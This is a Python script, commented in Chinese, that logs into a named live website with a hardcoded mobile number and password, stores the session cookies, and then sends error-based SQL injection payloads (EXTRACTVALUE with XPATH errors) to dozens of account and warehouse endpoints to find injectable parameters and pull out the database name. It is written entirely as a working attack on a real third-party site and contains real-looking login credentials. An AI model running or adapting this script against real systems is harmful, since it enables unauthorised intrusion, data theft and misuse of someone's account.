#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import time
import urllib3
urllib3.disable_warnings()

class AuthAfterSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.login()
        
    def login(self):
        """登录获取会话"""
        login_data = {
            'MobileNumber': '0902955198',
            'Password': 'Hieutruong@0115'
        }
        r = self.session.post(f"{self.base_url}/Account/JLogin", data=login_data, timeout=10)
        print(f"[*] 登录状态: {r.status_code}")
        if r.status_code == 200:
            cookies = dict(self.session.cookies)
            with open('session_cookies.json', 'w') as f:
                json.dump(cookies, f)
            print(f"[+] 登录成功，会话已保存")
    
    def test_endpoint_sqli(self, endpoint, param, payload, method='GET'):
        """测试端点SQL注入"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                r = self.session.get(url, timeout=10)
            elif method == 'POST':
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
            elif method == 'JSON':
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=10)
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_error = 'error' in r.text.lower() or 'sql' in r.text.lower()
            
            if has_test or has_xpath or has_error:
                return {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'status': r.status_code,
                    'len': len(r.text),
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_error': has_error,
                    'response': r.text[:500]
                }
        except:
            pass
        return None
    
    def extract_database(self, endpoint, param, method='GET'):
        """提取数据库"""
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--"
        
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                r = self.session.get(url, timeout=10)
            elif method == 'POST':
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
            elif method == 'JSON':
                data = {param: payload}
                r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=10)
            else:
                return None
            
            if 'XPATH' in r.text.upper():
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def comprehensive_test(self):
        """全面测试"""
        print("="*60)
        print("登录后全面SQL注入测试")
        print("="*60)
        
        # Account端点
        account_endpoints = [
            '/Account/GetUserInfo',
            '/Account/GetUser',
            '/Account/GetUserById',
            '/Account/Profile',
            '/Account/UserInfo',
            '/Account/UpdateProfile',
            '/Account/ChangePassword',
            '/Account/GetProfile',
        ]
        
        # Handle端点
        handle_endpoints = [
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
        ]
        
        params = ['id', 'ID', 'Id', 'userId', 'user_id', 'userID', 'customer_id', 'customerID']
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        working = []
        
        # 测试Account端点
        print("\n[*] 测试Account端点...")
        for endpoint in account_endpoints:
            for param in params:
                for method in ['GET', 'POST', 'JSON']:
                    result = self.test_endpoint_sqli(endpoint, param, payload, method)
                    if result:
                        print(f"    [!] {result['method']} {result['endpoint']} [{result['param']}]")
                        print(f"        状态: {result['status']}, 长度: {result['len']}")
                        print(f"        TEST: {result['has_test']}, XPATH: {result['has_xpath']}")
                        working.append(result)
                        
                        # 尝试提取数据库
                        if result['has_xpath']:
                            db_name = self.extract_database(endpoint, param, method)
                            if db_name:
                                print(f"        [+] 数据库名: {db_name}")
                                return endpoint, param, method, db_name
        
        # 测试Handle端点
        print("\n[*] 测试Handle端点...")
        handle_params = ['id', 'ID', 'DistrictID', 'ProvinceID', 'WareHouseID', 'q', 'search']
        for endpoint in handle_endpoints:
            for param in handle_params:
                for method in ['GET', 'POST', 'JSON']:
                    result = self.test_endpoint_sqli(endpoint, param, payload, method)
                    if result:
                        print(f"    [!] {result['method']} {result['endpoint']} [{result['param']}]")
                        print(f"        状态: {result['status']}, 长度: {result['len']}")
                        print(f"        TEST: {result['has_test']}, XPATH: {result['has_xpath']}")
                        working.append(result)
                        
                        if result['has_xpath']:
                            db_name = self.extract_database(endpoint, param, method)
                            if db_name:
                                print(f"        [+] 数据库名: {db_name}")
                                return endpoint, param, method, db_name
        
        return working
    
    def run_all(self):
        """执行所有测试"""
        working = self.comprehensive_test()
        
        # 保存结果
        with open('auth_after_sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump(working, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("测试结果")
        print("="*60)
        print(f"发现可疑注入点: {len(working)}")
        if not working:
            print("未发现可提取数据库的SQL注入")

if __name__ == "__main__":
    scanner = AuthAfterSQLi()
    scanner.run_all()